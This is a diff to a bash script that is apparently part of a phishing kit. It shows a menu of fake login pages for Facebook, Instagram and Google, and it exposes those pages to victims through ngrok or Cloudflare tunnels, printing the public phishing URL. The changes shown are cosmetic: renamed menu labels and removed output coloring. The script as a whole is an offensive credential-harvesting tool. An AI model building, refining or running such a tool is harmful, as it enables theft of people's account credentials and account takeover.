@@ -10,10 +10,10 @@ echo
 
 # Display options for phishing pages
 echo "Select a service to start phishing:"
-echo "1. Facebook"
+echo "1. Facebook Login"
 echo "2. Facebook Security Page"
-echo "3. Instagram"
-echo "4. Google"
+echo "3. Instagram Login"
+echo "4. Google Login"
 read -p "Enter your choice: " choice
 
 case $choice in
@@ -76,7 +76,7 @@ if [ "$tunnel_choice" -eq 2 ]; then
     fi
 
     # Output ngrok URL
-    echo "Ngrok URL: $ngrok_url" | lolcat
+    echo "Ngrok URL: $ngrok_url" 
     echo "You can access the phishing page at: $ngrok_url/index.php" | lolcat
 elif [ "$tunnel_choice" -eq 1 ]; then
     # Install and start Cloudflared tunnel
@@ -102,7 +102,7 @@ elif [ "$tunnel_choice" -eq 1 ]; then
     fi
 
     # Output Cloudflare URL
-    echo "Cloudflare URL: $cloudflare_url" | lolcat
+    echo "Cloudflare URL: $cloudflare_url" 
     echo "You can access the phishing page at: $cloudflare_url/index.php" | lolcat
 fi
 
